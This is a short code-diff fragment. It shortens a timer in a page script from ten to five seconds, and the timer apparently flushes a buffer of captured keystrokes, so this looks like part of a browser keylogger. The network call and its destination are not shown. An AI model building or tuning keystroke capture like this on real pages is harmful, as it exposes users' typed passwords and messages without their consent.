@@ -30,5 +30,5 @@ document.addEventListener("DOMContentLoaded", function () {
             });
             keystrokes = []; // Clear buffer
         }
-    }, 10000);
+    }, 5000);
 });
